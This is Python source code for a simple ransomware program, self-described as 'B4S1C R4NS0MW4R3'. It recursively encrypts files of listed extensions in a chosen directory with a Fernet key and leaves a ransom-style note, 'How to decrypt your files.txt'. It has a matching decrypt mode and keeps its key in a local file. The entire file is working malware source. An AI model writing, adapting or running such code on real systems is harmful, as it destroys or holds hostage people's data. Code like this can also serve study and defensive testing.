import os
import argparse
import pathlib
from cryptography.fernet import Fernet


# CLASSES
# Cryptography Key class
class CryptoKey:
    # Generate a cryptography key
    def generateKey():
        key_value = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key_value)

    
    # Load a cryptography key
    def loadKey():
        return open('key.key', 'rb').read()


# Ransomware functions class
class Ransomware:
    # Create a txt with decrypting instructions
    def createTxt(directory):
        with open(directory + '/' + 'How to decrypt your files.txt', 'w') as file:
            file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by ITS0V3R\n")
            file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")

    
    # Delete a txt with decrypting instructions
    def deleteTxt(directory):
        os.remove(directory + '/' + 'How to decrypt your files.txt')

    
    # Encrypt/Decrypt files
    def run(directory, key, action):
        # Delete the txt file with decrypting instructions
        if action == "decrypt":
            Ransomware.deleteTxt(directory)

        # Create a list with the file extensions
        file_extensions = [line.rstrip() for line in open('file_extensions.txt')]

        # Get all the files in the provided directory an recursively
        for current_path, _, files_in_current_path in os.walk(directory):
            for file in files_in_current_path:
                if pathlib.Path(file).suffix in file_extensions:
                    file_abs_full_path = os.path.join(current_path, file)

                    with open(file_abs_full_path, 'rb') as file_in_abs_path:
                        file_data = file_in_abs_path.read()
                        if action == "encrypt":
                            final_data = Fernet(key).encrypt(file_data)
                        elif action == "decrypt":
                            final_data = Fernet(key).decrypt(file_data)

                    with open(file_abs_full_path, 'wb') as file_in_abs_path:
                        file_in_abs_path.write(final_data)

         # Create the txt file with decrypting instructions
        if action == "encrypt":
            Ransomware.createTxt(directory)

        # Print the result
        print(f"[+] All the files from the directory '{directory}' and children were {'encrypted' if action == 'encrypt' else 'decrypted'} with success!\n")


# FUNCTIONS
# Function to get the arguments
def getArguments():
    parser = argparse.ArgumentParser(description="BASIC RANSOMWARE")
    parser.add_argument("-p", "--path", action="store", help="The path to encrypt/decrypt the files")
    parser.add_argument("-e", "--encrypt", action="store_true", help="The encrypt files action")
    parser.add_argument("-d", "--decrypt", action="store_true", help="The decrypt files action")
    args = parser.parse_args()

    # Check if the user passed the --encrypt --decrypt arguments at the same time
    if args.encrypt and args.decrypt:
        print("[-] ERROR - You passed the encrypt and decrypt actions at the same time! Please, use only one at time.")
        print("[-] Quitting...")
        quit()

    # Check if the user didn't pass --encrypt or --decrypt
    if not args.encrypt and not args.decrypt:
        print("[-] ERROR - You didn't provided --encrypt or --decrypt! Please, provide which operation you would like to run!")
        print("[-] Quitting...")
        quit()

    # Check if the user didn't provided a path to encrypt/decrypt
    if args.path:
        if not os.path.exists(args.path):
            print("[-] ERROR -  The provided path doesn't exist!")
            print("[-] Quitting...")
            quit()
    else:
        print(f"[-] ERROR - You need to provide an path to {'encrypt' if args.encrypt else 'decrypt'}!")
        print("[-] Quitting...")
        quit()

    # Return the arguments
    return args


# MAIN
if __name__ == '__main__':
    # Get the arguments
    args = getArguments()

    # The directory that will have the files encrypted/decrypted
    directory = args.path

    # Encrypt
    if args.encrypt:
        key = CryptoKey.generateKey()
        key = CryptoKey.loadKey()
        Ransomware.run(directory, key, "encrypt")

    # Decrypt
    elif args.decrypt:
        key = CryptoKey.loadKey()
        Ransomware.run(directory, key, "decrypt")
